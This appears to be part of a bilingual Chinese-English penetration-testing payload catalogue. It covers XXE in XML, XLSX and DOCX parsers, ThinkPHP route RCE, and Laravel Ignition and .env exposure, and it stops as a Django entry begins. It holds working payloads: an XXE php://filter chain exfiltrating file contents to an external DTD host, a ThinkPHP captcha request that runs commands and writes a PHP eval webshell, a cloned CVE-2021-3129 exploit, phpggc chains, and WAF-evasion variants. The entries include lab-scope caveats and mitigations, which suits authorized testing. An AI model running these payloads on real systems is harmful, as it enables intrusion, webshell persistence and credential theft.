description.en: Reflects file contents via the error message for a nonexistent path, useful when egress is blocked. Success: the error page contains file contents.

title.zh: XML 语法错误通道变体

description.zh: 把文件内容嵌入注定非法的 XML 片段，借解析器语法错误回显数据；成功判据：报错消息中出现数据。
description.en: Embeds file contents into a deliberately invalid XML fragment so the parser's syntax error leaks them. Success: data appears in the error message.

description.zh: 本地无文件路径特征、报错链在外部 DTD 完成，规避对 file:///etc 的本地拦截；成功判据：错误响应含 passwd 内容。
description.en: Keeps file paths out of the local payload by completing the error chain in the external DTD. Success: the error response contains passwd contents.

title.zh: XXE Error-based (通过错误消息获取数据)
title.en: Validation step 1 for Error-Based XXE Evidence Reflection

description.zh: 引用含报错实体的外部 DTD，让文件内容进入解析错误信息；错误消息中出现文件内容即确认报错回显通道。{LAB_OAST} 渲染为托管 error.dtd 的自有端点。
description.en: Reference an external DTD containing error entities so file content lands in parse errors; file content in the error message confirms the error-reflection channel. {LAB_OAST} renders to your endpoint hosting error.dtd.

description.zh: filter 链加 iconv 环节再 base64，规避 convert.base64-encode/resource 直连特征；成功判据：外带数据可双重还原。
description.en: Adds an iconv stage before base64 to evade the direct convert.base64-encode/resource signature. Success: exfil data survives double restoration.

description.zh: CDATA 转义写法变体 — CDATA 括号以 [/] 字符实体书写，规避对 <![CDATA[ 明文的检测；本块置于外部 DTD 托管，%all; 构造出以 CDATA 包裹文件内容的通用实体 fileContents，正文引用即完整展开；成功判据：解析输出出现 CDATA 包裹的完整 Base64 文件内容。
description.en: Writes CDATA brackets as character references to evade detection of the literal <![CDATA[. Success: the send entity is constructed and OAST is requested.

description.zh: 声明关键 token 间插入换行，打断一行式 SYSTEM "php://filter 匹配；成功判据：外部 DTD 拉取成功。
description.en: Splits declaration tokens across newlines to break one-line SYSTEM "php://filter matching. Success: the external DTD is fetched.

title.zh: XXE CDATA绕过(提取含特殊字符的文件)
title.en: Validation step 1 for XXE Special-Character Encoding with an External DTD

wafBypass.command:
<?xml version="1.0"?> 
 <!DOCTYPE data [ 
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={FILE_PATH}"> 
 <!ENTITY % dtd SYSTEM "http://{LAB_OAST}/cdata.dtd"> 
 %dtd; 
 ]> 
 <data>&send;</data>

description.zh: 以 php://filter Base64 读取目标文件并经外部 DTD 用 CDATA 包裹特殊字符内容；拼合解码得到完整文件内容即确认 CDATA 链可用。{LAB_OAST} 渲染为托管 cdata.dtd 的自有端点。
description.en: Read the target file via php://filter Base64 and wrap special characters with CDATA through an external DTD; reassembled and decoded file content confirms the CDATA chain. {LAB_OAST} renders to your endpoint hosting cdata.dtd.

name.zh: XLSX OOXML 解析器 XXE 验证

description.zh: 覆盖 XLSX 文件解析器的 XXE 验证：从 OOXML 部件清单展开定位可注入 XML 部件，到 workbook.xml 中嵌入外部实体样例，并附外部参数实体变体，用于确认文档解析入口的实体注入风险。
description.en: Covers XXE validation for XLSX file parsers: from OOXML part-manifest expansion locating injectable XML parts to external-entity samples embedded in workbook.xml, with external parameter-entity variants, confirming entity-injection risk at document parsing entry points.

prerequisites.zh: 确认 XLSX OOXML 解析器 XXE 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XLSX OOXML Parser XXE Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XLSX 文档解析入口的 XXE 验证：解包 spreadsheet.xlsx 定位 workbook.xml、sheet1.xml、sharedStrings.xml 等可注入部件，在 workbook.xml 嵌入外部实体并经 OAST 关联解析日志。适用于服务端解析上传表格的场景。
overview.en: Covers XXE verification at the XLSX document parsing entry: unpacking spreadsheet.xlsx to locate injectable parts such as workbook.xml, sheet1.xml, and sharedStrings.xml, then embedding external entities in workbook.xml with OAST-correlated parse logs. Suitable when the server parses uploaded spreadsheets.

vulnerability.zh: 根因是服务端 OOXML 解析栈允许 DTD 与外部实体，上传的 XLSX 部件在导入、预览或转换时被重新解析；文档解析入口比普通 XML 上传更隐蔽，风险常由异步转换服务触发。
vulnerability.en: The root cause is the server-side OOXML parsing stack allowing DTDs and external entities, re-parsing uploaded XLSX parts during import, preview, or conversion; document parsing entries are stealthier than plain XML uploads, with risk often triggered by asynchronous conversion services.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步解包 XLSX 列出部件清单，定位 workbook.xml 等解析入口；第 2 步构造保留合法 SpreadsheetML 命名空间的 workbook.xml 并嵌入指向自有 OAST 的实体，在无业务数据的授权导入夹具上传并触发解析，{LAB_OAST} 收到请求即确认解析器实体加载成立。被 WAF 拦截时改用外部参数实体变体。
exploitation.en: Use in Payload list order: step 1 unpacks the XLSX and lists the part inventory to locate parsing entries like workbook.xml; step 2 builds a workbook.xml preserving valid SpreadsheetML namespaces with an embedded entity pointing at your own OAST, uploads it to an authorized import fixture free of business data, and triggers parsing; {LAB_OAST} receiving the request confirms the parser loads entities. When blocked by a WAF, switch to the external parameter-entity variant.

mitigation.zh: OOXML 解析栈禁用 DTD 与外部实体，转换服务置于无网络低权限沙箱并校验部件清单、大小与压缩比；修复后上传实体样例应解析失败或无外带请求。
mitigation.en: Disable DTDs and external entities in the OOXML parsing stack, place conversion services in a network-free low-privilege sandbox, and validate part inventory, size, and compression ratio; after the fix, uploaded entity samples must fail parsing or produce no exfiltration requests.

description.zh: 解压目标表格文件，检查工作簿、工作表与共享字符串等 XML 部件，找到解析时必然读取的注入落点位置。
description.en: Unzip the xlsx and inspect workbook.xml, sheets and shared strings to find the XML part the parser always reads.

title.zh: workbook 注入实体指向探测端
title.en: Inject an entity into workbook.xml aimed at the probe

description.zh: 在工作簿部件声明指向探测地址的实体，重打包上传后解析即触发回连，确认表格解析链存在 XXE 漏洞可利用。
description.en: Add a DOCTYPE SYSTEM entity in workbook.xml pointing at the probe; repack, upload, and a callback confirms the spreadsheet XXE.

title.en: Deliver the spreadsheet to trigger parsing

description.zh: 把注毒表格经导入、预览等业务入口送达目标解析器，解析即触发实体加载，回连把命中信号回报控制端确认落地。
description.en: Deliver the poisoned file through import or preview workflows so any parser load fires the entity and reports back to the collector.

title.zh: 外部参数实体深化利用
title.en: Deepen exploitation with external parameter entities

description.zh: 改用参数实体加载远端 DTD 变体，解析器进一步拉取外部内容，为后续文件读取与数据外带扩展出稳定通道。
description.en: Switch to the parameter-entity variant loading a remote DTD so the parser fetches staged content for file read and exfil channels.

analysis.zh: XLSX OOXML 解析器 XXE 验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XLSX OOXML Parser XXE Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 明确检查 xl/workbook.xml 与工作表部件，并通过专用无数据 XLSX 夹具验证上传解析器。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 解包 spreadsheet.xlsx 并列出 workbook.xml、sheet1.xml、sharedStrings.xml 等部件，定位可注入实体的 XML 解析入口。
description.en: Unpacks spreadsheet.xlsx and lists workbook.xml, sheet1.xml, and sharedStrings.xml to locate the XML parsing entry points for entity injection.

explanation.zh: XLSX是ZIP压缩包，直接解压获取内部XML文件
explanation.en: Describes how the command segment "unzip spreadsheet.xlsx" participates in this validation command.

explanation.zh: 工作簿主配置文件，包含Sheet信息
explanation.en: Describes how the value segment "xl/workbook.xml" participates in this validation command.

explanation.zh: 工作表数据文件，包含单元格内容
explanation.en: Describes how the value segment "xl/worksheets/sheet1.xml" participates in this validation command.

explanation.zh: 内容类型定义文件，也可作为XXE注入点
explanation.en: Describes how the value segment "[Content_Types].xml" participates in this validation command.

description.zh: 判据: 以真实 SpreadsheetML 命名空间构造 workbook 部件并嵌入指向自有 OAST 的实体；仅在无业务数据的授权导入夹具上传触发解析并关联解析日志，{LAB_OAST} 收到请求即确认实体加载成立。
description.en: Use the real SpreadsheetML namespace and an owned OAST entity instead of an ellipsis namespace and system-file read. Correlate parser logs only in an authorized data-free import fixture.

title.zh: XLSX 外部参数实体变体

description.zh: XLSX 外部参数实体变体 — 在 workbook.xml 内以外部参数实体加载远端 DTD，定位明确、可复现；阳性必须同时具备 OAST 请求与服务端解析日志，不读取文件内容。
description.en: Replace the vague Content_Types modification note with a locatable external parameter-entity variant in workbook.xml. Require OAST and server parser logs as evidence without reading file content.

explanation.en: Reference and load the remote DTD

name.zh: DOCX OOXML 解析器 XXE 验证

description.zh: 覆盖 DOCX 文件解析器的 XXE 验证：从 OOXML 部件清单展开定位 document.xml，到其中嵌入外部实体样例，并附外部参数实体变体，用于确认 Word 文档解析入口的实体注入风险。
description.en: Covers XXE validation for DOCX file parsers: from OOXML part-manifest expansion locating document.xml to external-entity samples embedded within it, with external parameter-entity variants, confirming entity-injection risk at Word document parsing entry points.

prerequisites.zh: 确认 DOCX OOXML 解析器 XXE 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for DOCX OOXML Parser XXE Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 DOCX 文档解析入口的 XXE 验证：解包 document.docx 定位 word/document.xml 与关系部件，在其中嵌入外部实体并经 OAST 关联解析日志。适用于服务端预览、转换或索引 Word 文档的场景。
overview.en: Covers XXE verification at the DOCX document parsing entry: unpacking document.docx to locate word/document.xml and relationship parts, then embedding external entities with OAST-correlated parse logs. Suitable when the server previews, converts, or indexes Word documents.

vulnerability.zh: 根因是服务端 Office 文档处理链允许 DTD 与外部实体，word/document.xml 在预览、转换、索引或查毒时被重新解析；上传网关先接受文件、异步服务后触发解析，风险易被漏检。
vulnerability.en: The root cause is the server-side Office document chain allowing DTDs and external entities, re-parsing word/document.xml during preview, conversion, indexing, or antivirus scanning; the upload gateway accepts the file first and async services trigger parsing later, so the risk is easily missed.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步解包 DOCX 列出 document.xml、关系部件与 Content_Types，定位解析入口；第 2 步构造保留 WordprocessingML 命名空间的 document.xml 并嵌入指向自有 OAST 的实体，在无业务数据的授权导入夹具上传并触发预览/转换，{LAB_OAST} 收到请求即确认实体加载成立。被 WAF 拦截时改用外部参数实体变体。
exploitation.en: Use in Payload list order: step 1 unpacks the DOCX listing document.xml, relationship parts, and Content_Types to locate the parsing entry; step 2 builds a document.xml preserving WordprocessingML namespaces with an embedded entity pointing at your own OAST, uploads it to an authorized import fixture free of business data, and triggers preview/conversion; {LAB_OAST} receiving the request confirms entity loading. When blocked by a WAF, switch to the external parameter-entity variant.

mitigation.zh: Office 解析器禁用 DOCTYPE 与外部实体，转换服务无网络低权限运行并校验部件清单；修复后上传实体样例应无外带请求，并监控文档任务的异常实体错误。
mitigation.en: Disable DOCTYPE and external entities in Office parsers, run conversion services network-free with low privileges, and validate part inventory; after the fix, uploaded entity samples must produce no exfiltration requests, with abnormal entity errors on document jobs monitored.

description.zh: 解压目标文档检查正文、关系与内容类型等部件，确定解析器加载文档时必经的 XML 注入位置，锁定最佳落点。
description.en: Unzip the docx and inspect document.xml, rels and content types to find the XML part always parsed with the body.

title.zh: document 注入实体指向探测端
title.en: Inject an entity into document.xml aimed at the probe

description.zh: 在正文部件声明内加入指向探测地址的实体，重打包为文档后被打开或服务端解析时，即触发回连命中信号确认漏洞。
description.en: Declare a probe-pointing entity in the document.xml DOCTYPE; repacking the file and opening it triggers the callback hit.

title.en: Deliver the document to trigger parsing

description.zh: 把注毒文档通过协同分享、在线预览等路径送达目标环境，解析器加载文档即执行实体，控制端收到回连确认命中。
description.en: Route the poisoned document through sharing or online preview; the parser load executes the entity and the collector receives the hit.

title.zh: 参数实体变体扩展通道
title.en: Extend the channel with parameter-entity variants

description.zh: 换参数实体拉取远端 DTD，突破内部实体使用限制后，可继续挂载文件读取与数据外带利用块持续推进攻击。
description.en: Swap in parameter entities pulling a remote DTD to move past internal-entity limits and stage file read and exfil blocks.

analysis.zh: DOCX OOXML 解析器 XXE 验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: DOCX OOXML Parser XXE Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 明确检查 word/document.xml 与关系部件，并通过专用无数据 DOCX 夹具验证上传解析器。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 解包 document.docx 并列出 document.xml、关系部件与 Content_Types，定位可注入实体的 XML 解析入口。
description.en: Unpacks document.docx and lists document.xml, relationship parts, and Content_Types to locate the XML parsing entry points for entity injection.

explanation.zh: DOCX是ZIP压缩包，解压获取内部XML
explanation.en: Describes how the command segment "unzip document.docx" participates in this validation command.

explanation.zh: 主文档内容文件，核心注入点
explanation.en: Describes how the value segment "word/document.xml" participates in this validation command.

explanation.zh: 文档关系文件，也可作为注入点
explanation.en: Describes how the value segment "word/_rels/document.xml.rels" participates in this validation command.

explanation.zh: 内容类型定义，备选注入点
explanation.en: Describes how the value segment "[Content_Types].xml" participates in this validation command.

description.zh: 判据: 以真实 WordprocessingML 命名空间构造 document 部件并嵌入指向自有 OAST 的实体；仅在无业务数据的授权导入夹具上传触发解析并关联解析日志，{LAB_OAST} 收到请求即确认实体加载成立。
description.en: Use the real WordprocessingML namespace and an owned OAST entity instead of an ellipsis namespace and system-file read. Correlate parser logs only in an authorized data-free import fixture.

title.zh: DOCX 外部参数实体变体

description.zh: DOCX 外部参数实体变体 — 在 document.xml 内以外部参数实体加载远端 DTD 作为可定位变体；阳性必须同时具备 OAST 请求与服务端 OOXML 解析日志。
description.en: Replace the vague relationship-part note with a locatable external parameter-entity variant in document.xml. A positive result requires both OAST and server-side OOXML parser logs.

explanation.en: Expand and load the external DTD

name.zh: ThinkPHP 版本与路由执行回归

description.zh: 覆盖 ThinkPHP 多版本 RCE 验证：从 TP5.0 invokeFunction 与 TP5.1 路由执行，到 captcha 模块 __construct 触发 RCE，再到版本指纹与路由探测，并附编码与入口变形绕过。
description.en: Covers RCE validation across ThinkPHP versions: from TP5.0 invokeFunction and TP5.1 route execution through captcha-module __construct RCE to version fingerprinting and route probing, with encoding and entry-mutation bypasses.

prerequisites.zh: 确认 ThinkPHP 版本与路由执行回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for ThinkPHP Version and Route-Execution Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: ThinkPHP 版本与路由执行回归针对 ThinkPHP 多版本路由到动态调用的 RCE 场景。覆盖 TP5.0 invokeFunction、TP5.1 路由执行、captcha 模块 __construct 触发与版本指纹探测四类验证维度，并附编码与入口变形绕过。
overview.en: The ThinkPHP version and route-execution regression targets multi-version ThinkPHP RCE via routing into dynamic invocation. It covers four verification dimensions—TP5.0 invokeFunction, TP5.1 route execution, captcha-module __construct triggering, and version fingerprinting—plus encoding and entry-point variant bypasses.

vulnerability.zh: 根因是受影响版本未过滤路由中的控制器与方法名，或 Request 属性可被 _method 覆盖后进入 filter 回调，用户输入因此到达 call_user_func_array、system 等动态调用与命令执行边界。
vulnerability.en: The root cause is affected versions failing to filter controller and method names in routes, or Request properties being overridden via _method into filter callbacks—user input therefore reaches dynamic invocation and command-execution boundaries such as call_user_func_array and system.

exploitation.zh: 按 Payload 列表顺序使用：先以第 4 步验版本；TP5.0.x 用第 1 步 invokefunction 路由调用 call_user_func_array 执行 system、写 shell.php；TP5.1.x 用第 2 步三条路由验证；captcha 用第 3 步提交 _method=__construct 加 filter[]=system。id 返回 uid= 或 shell.php 可达即命中；被拦时改用编码与入口变形。
exploitation.en: Use payloads in list order: confirm the version with step 4 first; for TP5.0.x use step 1's invokefunction route to call call_user_func_array, run system, and write shell.php; for TP5.1.x verify with step 2's three routes; with captcha, POST _method=__construct plus filter[]=system per step 3. A hit is id returning uid= or shell.php reachable; if blocked, use encoding and entry-point variants.

mitigation.zh: 升级到供应商支持版本并应用补丁，关闭生产调试与动态调用，限制路由参数与允许类型；WAF 兼备编码规范化。修复后重放第 1-3 步路由载荷，确认返回 404 或参数被过滤，且第 4 步指纹不再暴露版本细节。
mitigation.en: Upgrade to vendor-supported versions with patches, disable production debug and dynamic invocation, and restrict route parameters and allowed types; pair with a WAF that normalizes encodings. After the fix, replay the step 1-3 route payloads and confirm 404s or filtered parameters, with step-4 fingerprinting no longer revealing version details.

description.zh: 从 X-Powered-By 与响应特征确认 ThinkPHP 版本，探测 init 与 input 路由可达性。命中判据：版本与可用路由入口明确。
description.en: Read X-Powered-By and probe init/input routes to pin the version. Success: version and reachable routes are known.

description.zh: 经 invokefunction 路由调用 call_user_func_array 执行 phpinfo 并写入 Shell。命中判据：返回 phpinfo 页面或 Shell 成功落盘可访问。
description.en: Drive call_user_func_array through invokefunction to run phpinfo and drop a shell. Success: phpinfo returns or shell lands.

description.zh: 对 5.1 目标用 input、Container 与 Template 三条路由执行命令或写 Shell。命中判据：id 返回 uid=… 或 Shell 可访问。
description.en: On 5.1 use input/Container/Template routes to run commands or write a shell. Success: uid= returns or shell is reachable.

description.zh: 向 captcha 路由提交 _method=__construct 覆盖 Request 属性，经 filter 执行命令。命中判据：命令输出返回响应。
description.en: POST _method=__construct to the captcha route to overwrite Request and run via filter. Success: command output returns.

attackChain.payload:
POST /index.php?s=captcha HTTP/1.1 
 Content-Type: application/x-www-form-urlencoded 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[cmd]);?>' > shell.php

title.en: Evade via encoding and case tricks

description.zh: 路由被拦截时用 URL 编码、双重编码与大小写变形重新投递请求。命中判据：变形后的路由仍能触发命令执行。
description.en: When routes are blocked, retry with URL/double encoding and case variants. Success: the mutated route still fires.

analysis.zh: ThinkPHP 版本与路由执行回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: ThinkPHP Version and Route-Execution Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 先固定框架版本、路由和补丁状态，再用无害标记验证特定动态调用边界，不泛化到所有 ThinkPHP。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 经 invokefunction 路由调用 call_user_func_array 执行 phpinfo/system 并写入 shell.php，验证 TP5.0.x 未过滤控制器名的远程代码执行。
description.en: Call call_user_func_array through the invokefunction route to run phpinfo/system and write shell.php, verifying TP5.0.x RCE via an unfiltered controller name.

description.zh: 以 input、invokefunction 与 Template write 三条路由执行 system 命令或写入 shell.php。命中判据：id 返回 uid=… 或 shell.php 写入成功且可访问。
description.en: Uses the input, invokefunction, and Template write routes to run system commands or drop shell.php. Success check: id returns uid=... or shell.php is written and reachable.

execution.command:
POST /index.php?s=captcha HTTP/1.1 
 Content-Type: application/x-www-form-urlencoded 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[cmd]);?>' > shell.php

description.zh: 向 /index.php?s=captcha 提交 _method=__construct 覆盖 Request 属性，经 filter[]=system 执行命令或写入 WebShell。
description.en: Post _method=__construct to /index.php?s=captcha to overwrite Request properties, executing commands via filter[]=system or writing a webshell.

title.zh: TP 版本指纹与路由探测
title.en: TP version fingerprint and route probing

description.zh: 以 X-Powered-By: ThinkPHP 响应头（存在时）或错误页/默认页中的 ThinkPHP 版本标识确认版本，并探测 \think\app/init 与 \think\Request/input 两条路由的可达性，为后续向量选择提供依据。
description.en: Confirm the ThinkPHP version via the X-Powered-By header and probe reachability of the \think\app/init and \think\Request/input routes to guide vector selection.

description.zh: 对 invokefunction 路径分别施加单次编码、类名大小写变形与双重编码，验证仅匹配明文路由的防护规则可被绕过。
description.en: Apply single encoding, class-name case variants, and double encoding to the invokefunction path, verifying defenses matching only the plaintext route are evaded.

explanation.zh: URL 编码的路径分隔符 /

description.zh: 以大小写、无前导斜杠与不同入口文件（/index.php、/public/index.php）形式重放 invokefunction 路由，验证路径归一化差异导致的绕过。
description.en: Replay the invokefunction route with case variants, no leading slash, and different entry files (/index.php, /public/index.php), exposing bypasses caused by path-normalization differences.

explanation.zh: 命名空间分隔符用反斜杠的控制器写法
explanation.en: Controller path written with namespace backslashes

explanation.zh: 正斜杠形式的控制器写法
explanation.en: Controller path written with forward slashes

explanation.zh: 公共入口文件的替代路径
explanation.en: Alternative entry path via the public directory

name.zh: Laravel 配置与反序列化回归

description.zh: 覆盖 Laravel 框架漏洞利用链验证：从 Ignition CVE-2021-3129 RCE 与 PHPGGC 生成框架利用链，到 .env 配置泄露读取，再到 Tinker 加密数据解密，用于确认配置暴露与反序列化风险。
description.en: Covers Laravel exploit-chain validation: from Ignition CVE-2021-3129 RCE and PHPGGC-generated framework chains through .env configuration leak reads to Tinker decryption of encrypted data, confirming configuration exposure and deserialization risk.

prerequisites.zh: 确认 Laravel 配置与反序列化回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Laravel Configuration and Deserialization Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: Laravel 配置与反序列化回归针对 Laravel 部署暴露与反序列化入口的组合场景。覆盖 Ignition CVE-2021-3129 RCE、PHPGGC 框架链生成、.env 配置泄露与 Tinker 解密四类验证维度。
overview.en: The Laravel configuration and deserialization regression targets combined scenarios of Laravel deployment exposure and deserialization entries. It covers four verification dimensions: Ignition CVE-2021-3129 RCE, PHPGGC framework-chain generation, .env configuration leakage, and Tinker decryption.

vulnerability.zh: 根因有两类：Ignition 错误页在调试模式暴露时允许通过 phar:// 流触发文件包含；.env 直接回源则泄露 APP_KEY，持有密钥即可伪造签名并解密 Laravel 加密数据，反序列化入口配合 PHPGGC 链升级为命令执行。
vulnerability.en: There are two root causes: the Ignition error page, when exposed in debug mode, allows file inclusion via phar:// streams; and a directly served .env leaks APP_KEY, enabling signature forgery and decryption of Laravel-encrypted data, while a deserialization entry combined with PHPGGC chains escalates to command execution.

exploitation.zh: 按 Payload 列表顺序使用：先按第 3 步请求 /.env 等路径，返回 APP_KEY 即配置泄露；再用第 1 步脚本对 /_ignition/health-check 触发 phar:// 包含实现 RCE；有反序列化入口时用第 2 步 phpggc 生成 Laravel/RCE1、RCE2、RCE4、RCE5、RCE9 链逐条投递；第 4 步在 tinker 中解密泄露数据。被拦截时改用路径变形枚举 .env。
exploitation.en: Use payloads in list order: request /.env and siblings per step 3—a returned APP_KEY is configuration leakage; then trigger phar:// inclusion for RCE against /_ignition/health-check with step 1's script; with a deserialization entry, generate and deliver the Laravel/RCE1, RCE2, RCE4, RCE5, RCE9 chains via step 2's phpggc one by one; step 4 decrypts leaked data in tinker. If blocked, use path-variant .env enumeration.

mitigation.zh: 生产环境关闭调试并移除 /_ignition 路由，Web 根指向 public 目录使 .env 不可回源，轮换已暴露的 APP_KEY 并重加密数据；升级 Laravel 与依赖。修复后重放第 1、3 步，确认错误页与 .env 均不可达且业务正常。
mitigation.en: Disable debug in production and remove the /_ignition route, point the web root at public so .env cannot be fetched, rotate any exposed APP_KEY, and re-encrypt data; upgrade Laravel and dependencies. After the fix, replay steps 1 and 3 and confirm the error page and .env are unreachable while the app works normally.

description.zh: 依次请求 /.env、/../.env 与 /public/.env 读取 APP_KEY 与数据库连接信息。命中判据：返回 APP_KEY 与 DB 凭据。
description.en: Request /.env variants to pull APP_KEY and DB credentials. Success: APP_KEY and DB creds are returned.

attackChain.payload:
GET /.env HTTP/1.1 
 GET /../.env HTTP/1.1 
 GET /public/.env HTTP/1.1 
 # APP_KEY=base64:... 
 # DB_HOST=localhost 
 # DB_DATABASE=laravel 
 # DB_USERNAME=root 
 # DB_PASSWORD=password

description.zh: 进入 artisan tinker 用 Crypt::decryptString 还原拿到的加密值。命中判据：密文被成功解密出明文。
description.en: Use tinker's Crypt::decryptString with the leaked APP_KEY. Success: ciphertexts decrypt to plaintext.

title.zh: 利用 Ignition 漏洞执行

description.zh: 经 /_ignition/health-check 配合 phar:// 流触发文件包含，运行利用脚本实现执行。命中判据：脚本返回命令输出。
description.en: Hit /_ignition/health-check with a phar:// based file delete/include chain. Success: the exploit returns command output.

description.zh: 用 phpggc 生成 RCE1 到 RCE9 五条链，配合泄露的 APP_KEY 构造签名载荷投递。命中判据：生成串可触发 system 执行。
description.en: Generate phpggc RCE1-RCE9 chains and forge signed payloads with APP_KEY. Success: a chain triggers system.

description.zh: .env 路径被限制时用 ..%2f 与双重编码变形枚举各环境文件。命中判据：变形路径读到配置内容。
description.en: When /.env is restricted, try ..%2f and double-encoded variants. Success: a mutated path returns config.

analysis.zh: Laravel 配置与反序列化回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Laravel Configuration and Deserialization Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 核对 Laravel 版本、APP_KEY 暴露、调试模式和反序列化入口，并只运行无害框架夹具。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

execution.command:
# Laravel Ignition RCE（CVE-2021-3129） 
 git clone https://github.com/zhzyker/CVE-2021-3129 
 cd CVE-2021-3129 
 python3 exp.py http://{LAB_APP} 
 phpggc Laravel/RCE1 system id > payload 
 POST /_ignition/execute-solution HTTP/1.1 
 Content-Type: application/json 
 {"solution":"...","parameters":{"viewFile":"phar://...","relativePath":"..."}}

description.zh: 克隆 zhzyker/CVE-2021-3129 利用脚本并指定目标，经 /_ignition/execute-solution 的 viewFile 参数配合 phpggc 生成的 phar:// 流与 php://filter 链触发文件包含，实现远程代码执行。
description.en: Clone the CVE-2021-3129 exploit script against the target and trigger file inclusion via /_ignition/health-check with a phar:// stream for remote code execution.

name.zh: Django 版本与安全配置回归

description.zh: 覆盖 Django 版本漏洞与配置回归验证：从 CVE-2020-7471 StringAgg 注入探测，到 DEBUG 页面配置提取与 signing 签名伪造，再到静态目录路径遍历，用于确认部署的安全配置缺口。
description.en: Covers Django version-vulnerability and configuration regression validation: from CVE-2020-7471 StringAgg injection probing through DEBUG-page configuration extraction and signing forgery to static-directory path traversal, confirming security-configuration gaps in deployments.

prerequisites.zh: 确认 Django 版本与安全配置回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Django Version and Security-Configuration Regression are inside a reversible authorized lab scope.

